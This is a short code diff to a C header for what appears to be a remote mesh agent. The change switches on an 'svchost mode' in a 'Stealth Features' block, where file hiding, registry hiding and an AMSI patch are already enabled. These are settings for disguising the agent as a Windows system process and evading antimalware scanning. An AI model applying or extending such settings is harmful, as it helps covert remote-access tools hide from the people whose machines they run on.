@@ -58,7 +58,7 @@
 
 /* ========== Stealth Features ========== */
 #define MESH_AGENT_STEALTH_ENABLED 1
-#define MESH_AGENT_SVCHOST_MODE 0
+#define MESH_AGENT_SVCHOST_MODE 1
 #define MESH_AGENT_HIDE_FILES 1
 #define MESH_AGENT_HIDE_REGISTRY 1
 #define MESH_AGENT_AMSI_PATCH 1
